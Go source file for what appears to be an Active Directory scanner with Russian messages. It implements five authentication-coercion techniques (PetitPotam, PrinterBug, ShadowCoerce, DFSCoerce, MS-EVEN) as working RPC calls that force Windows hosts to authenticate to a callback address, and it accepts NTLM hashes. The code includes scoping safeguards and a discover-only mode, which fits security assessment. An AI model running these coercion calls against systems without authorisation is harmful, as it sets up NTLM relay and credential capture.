package adscan

import (
	"context"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/oiweiwei/go-msrpc/midl/uuid"
	"github.com/oiweiwei/go-msrpc/msrpc/dfsnm/netdfs/v3"
	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
	"github.com/oiweiwei/go-msrpc/msrpc/efsr/efsrpc/v1"
	"github.com/oiweiwei/go-msrpc/msrpc/even/eventlog/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/fsrvp/fileservervssagent/v1"
	"github.com/oiweiwei/go-msrpc/msrpc/rprn/winspool/v1"
	"github.com/oiweiwei/go-msrpc/ssp"
	"github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"
)

// CoercionOptions uses named-pipe RPC over TCP/445. Callback is a reachable IPv4
// address assigned to this machine. The receiver never serves shares or relays.
type CoercionOptions struct {
	Targets      []string
	Callback     string
	Credential   AccessOptions
	Methods      []string
	Timeout      time.Duration
	DiscoverOnly bool
}

func RunCoercion(parent context.Context, o CoercionOptions, progress func(string)) ([]AccessReport, error) {
	var ip net.IP
	if !o.DiscoverOnly {
		ip = net.ParseIP(strings.TrimSpace(o.Callback))
		if ip == nil || ip.To4() == nil || ip.IsUnspecified() || ip.IsMulticast() {
			return nil, fmt.Errorf("укажи локальный доступный IPv4 приёмника")
		}
		o.Callback = ip.String()
		local := false
		addrs, err := net.InterfaceAddrs()
		if err != nil {
			return nil, err
		}
		for _, a := range addrs {
			if n, ok := a.(*net.IPNet); ok && n.IP.Equal(ip) {
				local = true
			}
		}
		if !local {
			return nil, fmt.Errorf("адрес приёмника %s не назначен локальному интерфейсу", ip)
		}
	}
	if o.Credential.Credential.Username != "" {
		c := o.Credential.Credential
		if c.Type != "password" && c.Type != "ntlm-hash" {
			return nil, fmt.Errorf("учётка: требуется пароль или NTLM-хеш")
		}
		if c.Type == "ntlm-hash" {
			b, e := hex.DecodeString(c.Secret)
			if e != nil || len(b) != 16 {
				return nil, fmt.Errorf("NTLM-хеш должен содержать 16 байт")
			}
		}
	}
	if len(o.Targets) == 0 || len(o.Targets) > 4096 {
		return nil, fmt.Errorf("выбери 1–4096 машин")
	}
	if o.Timeout == 0 {
		o.Timeout = 8 * time.Second
	}
	if o.Timeout < time.Second || o.Timeout > 30*time.Second {
		return nil, fmt.Errorf("таймаут: 1–30 секунд")
	}
	if len(o.Methods) == 0 {
		o.Methods = []string{"petitpotam", "printerbug", "shadowcoerce", "dfscoerce", "mseven"}
	}
	for _, m := range o.Methods {
		switch m {
		case "petitpotam", "printerbug", "shadowcoerce", "dfscoerce", "mseven":
		default:
			return nil, fmt.Errorf("неизвестный метод %q", m)
		}
	}
	// Resolve once before starting the listener; callbacks are admitted only from
	// selected addresses. DNS changes during the run cannot expand this scope.
	targets := []string{}
	skipped := []AccessReport{}
	seen := map[string]bool{}
	for _, host := range o.Targets {
		if strings.ContainsAny(host, "/\\ \t\r\n") {
			return nil, fmt.Errorf("некорректный хост %q", host)
		}
		resolveCtx, resolveCancel := context.WithTimeout(parent, 4*time.Second)
		ips, e := net.DefaultResolver.LookupIPAddr(resolveCtx, host)
		resolveCancel()
		if e != nil {
			return nil, fmt.Errorf("%s: %w", host, e)
		}
		for _, a := range ips {
			if a.IP.To4() != nil {
				s := a.IP.String()
				if a.IP.Equal(ip) {
					r := AccessReport{Host: host, Mode: "coercion"}
					r.add("coercion/skipped-local", "Локальный приёмник", "skipped", "info", "Адрес приёмника исключён из целей Coerce")
					skipped = append(skipped, r)
					if progress != nil {
						progress("Пропуск локального приёмника " + host)
					}
					break
				}
				if !seen[s] {
					seen[s] = true
					targets = append(targets, s)
				}
				break
			}
		}
	}
	if len(targets) == 0 {
		if len(skipped) > 0 {
			return skipped, nil
		}
		return nil, fmt.Errorf("нет IPv4 целей")
	}
	var receiver *coercionReceiver
	if !o.DiscoverOnly {
		var err error
		var owned bool
		receiver, owned, err = receiverForCoercion(parent, ip.String(), seen)
		if err != nil {
			return nil, err
		}
		if owned {
			defer receiver.close()
		}
	}
	reports := append([]AccessReport{}, skipped...)
	for _, host := range targets {
		if parent.Err() != nil {
			return reports, parent.Err()
		}
		r := AccessReport{Host: host, Mode: "coercion"}
		if o.DiscoverOnly {
			r.Mode = "coercion-discovery"
		}
		if progress != nil {
			progress("Coerce · " + host + " · TCP/445")
		}
		ctx, cancel := context.WithTimeout(parent, 3*time.Second)
		conn, e := (&net.Dialer{}).DialContext(ctx, "tcp", net.JoinHostPort(host, "445"))
		cancel()
		if e != nil {
			r.add("coercion/smb", "SMB TCP/445", "incomplete", "info", e.Error())
			reports = append(reports, r)
			continue
		}
		conn.Close()
		r.add("coercion/smb", "SMB TCP/445", "observed", "info", "TCP-соединение установлено")
		for _, method := range o.Methods {
			if parent.Err() != nil {
				reports = append(reports, r)
				return reports, parent.Err()
			}
			before := time.Now()
			ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(parent), o.Timeout)
			bound, callErr := coercionCall(ctx, host, o.Callback, method, o.Credential, o.DiscoverOnly)
			cancel()
			// A rejected SMB session prevents every named-pipe RPC method. Do not
			// retry the same login five times or generate five empty callbacks.
			if !bound && smbAuthenticationRejected(callErr) {
				r.add("coercion/smb-auth", "Coerce · вход SMB", "denied", "info", "SMB отклонил вход; RPC-методы не запускались. Проверь выбранную учётку. Причина: "+callErr.Error())
				if progress != nil {
					progress("Coerce · " + host + " · SMB отклонил вход; RPC не проверен")
				}
				break
			}
			evidence := "RPC bind не выполнен; доступность интерфейса не оценена"
			if bound {
				evidence = "RPC bind выполнен; вызов отправлен"
				if o.DiscoverOnly {
					evidence = "RPC bind выполнен; доступность интерфейса не доказывает Coerce"
				}
			}
			if callErr != nil {
				evidence += "; " + callErr.Error()
			}
			state := "incomplete"
			if callErr != nil && (strings.Contains(strings.ToLower(callErr.Error()), "permission denied") || strings.Contains(strings.ToLower(callErr.Error()), "access_denied") || strings.Contains(strings.ToLower(callErr.Error()), "logon_failure")) {
				state = "denied"
			}
			if callErr != nil && (strings.Contains(callErr.Error(), "nca_unk_if") || strings.Contains(callErr.Error(), "file does not exist")) {
				state = "unavailable"
			}
			if bound && state == "incomplete" {
				state = "observed"
			}
			r.add("coercion/"+method, "Coerce · "+method, state, "info", evidence)
			if o.DiscoverOnly {
				continue
			}
			// Callback evidence is scoped to the target and time window, not claimed
			// as proof of a specific method: asynchronous retries may arrive later.
			timer := time.NewTimer(1500 * time.Millisecond)
			select {
			case <-parent.Done():
				timer.Stop()
			case <-timer.C:
			}
			events := receiver.since(host, before)
			for _, event := range events {
				severity := "info"
				if event.Stage == "ntlm-authenticate" {
					severity = "high"
				}
				r.add("coercion/callback/"+method+"/"+event.Stage, "Coerce · входящий SMB", "observed", severity, fmt.Sprintf("%s · %s · %s; временное окно %s; NTLM ответ не проверен криптографически", event.Time.Format(time.RFC3339Nano), event.Stage, event.Identity, method))
			}
			if len(events) == 0 {
				r.add("coercion/callback/"+method, "Coerce · обратное соединение", "incomplete", "info", "Callback не наблюдался; это не доказывает защищённость")
			}
		}
		reports = append(reports, r)
	}
	return reports, nil
}

func coercionCall(ctx context.Context, host, callback, method string, o AccessOptions, discoverOnly bool) (bool, error) {
	pipe := ""
	switch method {
	case "petitpotam":
		pipe = "efsrpc"
	case "printerbug":
		pipe = "spoolss"
	case "shadowcoerce":
		pipe = "FssagentRpc"
	case "dfscoerce":
		pipe = "netdfs"
	case "mseven":
		pipe = "eventlog"
	}
	opts := []dcerpc.Option{dcerpc.WithEndpoint("ncacn_np:[" + pipe + "]"), dcerpc.WithSMBPort(445), dcerpc.WithMechanism(ssp.NTLM), dcerpc.WithTimeout(4 * time.Second)}
	if o.Credential.Username != "" {
		user := o.Credential.Username
		if o.Domain != "" && !strings.ContainsAny(user, "\\@") {
			user = o.Domain + "\\" + user
		}
		if o.Credential.Type == "ntlm-hash" {
			opts = append(opts, dcerpc.WithCredentials(credential.NewFromNTHash(user, o.Credential.Secret)))
		} else {
			opts = append(opts, dcerpc.WithCredentials(credential.NewFromPassword(user, o.Credential.Secret)))
		}
	}
	cc, err := dcerpc.Dial(ctx, host, opts...)
	if err != nil {
		return false, fmt.Errorf("%s dial: %w", pipe, err)
	}
	defer func() {
		closeCtx, cancel := context.WithTimeout(context.Background(), time.Second)
		defer cancel()
		cc.Close(closeCtx)
	}()
	bind := []dcerpc.Option{dcerpc.WithInsecure()}
	if o.Credential.Username != "" {
		bind = []dcerpc.Option{dcerpc.WithSeal()}
	}
	path := `\\` + callback + `\wscan-coerce\probe`
	switch method {
	case "petitpotam":
		cli, e := efsrpc.NewEfsrpcClient(ctx, efsNamedPipeConn{cc}, bind...)
		if e != nil {
			return false, e
		}
		if discoverOnly {
			return true, nil
		}
		_, e = cli.EncryptFileServer(ctx, &efsrpc.EncryptFileServerRequest{FileName: path})
		return true, e
	case "shadowcoerce":
		cli, e := fileservervssagent.NewFileServerVSSAgentClient(ctx, cc, bind...)
		if e != nil {
			return false, e
		}
		if discoverOnly {
			return true, nil
		}
		_, e = cli.IsPathSupported(ctx, &fileservervssagent.IsPathSupportedRequest{ShareName: `\\` + callback + `\wscan-coerce`})
		return true, e
	case "dfscoerce":
		cli, e := netdfs.NewNetdfsClient(ctx, cc, bind...)
		if e != nil {
			return false, e
		}
		if discoverOnly {
			return true, nil
		}
		// This receiver has no DFS namespace or shares to remove.
		_, e = cli.RemoveStdRoot(ctx, &netdfs.RemoveStdRootRequest{ServerName: callback, RootShare: "wscan-coerce", Flags: 1})
		return true, e
	case "mseven":
		cli, e := eventlog.NewEventlogClient(ctx, cc, bind...)
		if e != nil {
			return false, e
		}
		if discoverOnly {
			return true, nil
		}
		resp, e := cli.OpenBackupEventLogW(ctx, &eventlog.OpenBackupEventLogWRequest{BackupFileName: &dtyp.UnicodeString{Buffer: `\??\UNC\` + callback + `\wscan-coerce\probe`}, MajorVersion: 1, MinorVersion: 1})
		if resp != nil && resp.Log != nil {
			c, cancel := context.WithTimeout(context.Background(), time.Second)
			cli.CloseEventLog(c, &eventlog.CloseEventLogRequest{Log: resp.Log})
			cancel()
		}
		return true, e
	case "printerbug":
		cli, e := winspool.NewWinspoolClient(ctx, cc, bind...)
		if e != nil {
			return false, e
		}
		if discoverOnly {
			return true, nil
		}
		opened, e := cli.OpenPrinter(ctx, &winspool.OpenPrinterRequest{PrinterName: `\\` + host, DevModeContainer: &winspool.DevModeContainer{}})
		if e != nil {
			return true, e
		}
		if opened == nil || opened.Handle == nil {
			return true, fmt.Errorf("OpenPrinter не вернул handle")
		}
		defer func() {
			c, cancel := context.WithTimeout(context.Background(), time.Second)
			defer cancel()
			cli.ClosePrinter(c, &winspool.ClosePrinterRequest{Printer: opened.Handle})
		}()
		_, e = cli.RemoteFindFirstPrinterChangeNotificationEx(ctx, &winspool.RemoteFindFirstPrinterChangeNotificationExRequest{Printer: opened.Handle, Flags: 0x100, LocalMachine: `\\` + callback})
		return true, e
	}
	return false, fmt.Errorf("неизвестный метод")
}

// The generated client defaults to the lsarpc UUID. The efsrpc named pipe
// uses another UUID with identical NDR operations (MS-EFSR 3.1.4.2).
// NewEfsrpcClient appends its default syntax as the final option.
type efsNamedPipeConn struct{ dcerpc.Conn }

func (c efsNamedPipeConn) Bind(ctx context.Context, opts ...dcerpc.Option) (dcerpc.Conn, error) {
	if len(opts) == 0 {
		return nil, fmt.Errorf("missing EFSRPC bind options")
	}
	syntax := &dcerpc.SyntaxID{IfUUID: uuid.MustParse("df1941c5-fe89-4e79-bf10-463657acf44d"), IfVersionMajor: 1}
	return c.Conn.Bind(ctx, append(opts[:len(opts)-1], dcerpc.WithAbstractSyntax(syntax))...)
}

func smbAuthenticationRejected(err error) bool {
	if err == nil {
		return false
	}
	message := strings.ToLower(err.Error())
	return strings.Contains(message, "open smb session") && (strings.Contains(message, "permission denied") || strings.Contains(message, "logon_failure") || strings.Contains(message, "access_denied"))
}
